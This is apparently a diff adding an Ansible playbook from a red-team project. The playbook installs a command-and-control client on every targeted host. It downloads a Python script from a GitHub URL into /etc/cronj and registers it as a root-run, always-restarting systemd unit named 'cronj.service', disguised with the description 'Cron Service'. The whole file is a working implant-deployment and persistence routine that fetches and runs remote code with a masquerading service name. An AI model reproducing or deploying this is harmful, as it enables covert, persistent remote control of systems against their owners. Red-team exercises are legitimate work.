@@ -1,0 +1,43 @@
+---
+  - name: "Installing C2 as cronj.service"
+    hosts: all
+    become: true
+
+    tasks:
+      - name: "Ensuring cronj directory exsists"
+        file:
+          path: /etc/cronj
+          state: directory
+
+
+      - name: "Getting C2 client"
+        get_url:
+          url: "https://github.com/lmcewen9/luke_mcewen_projects/raw/refs/heads/main/redteam/fun.py"
+          dest: "/etc/cronj/cronservice.py"
+
+
+      - name: "Creating cronj.service"
+        copy:
+          content: |
+            [Unit]
+            Description=Cron Service
+            After=network.target
+            StartLimitIntervalSec=0
+
+            [Service]
+            Type=simple
+            Restart=always
+            RestartSec=1
+            User=root
+            ExecStart=/usr/bin/python3 /etc/cronj/cronservice.py
+
+            [Install]
+            WantedBy=multi-user.target
+          dest: "/etc/systemd/system/cronj.service"
+
+
+      - name: "Starting/Enabling cronj.service"
+        systemd_service:
+          name: cronj
+          enabled: true
+          state: started
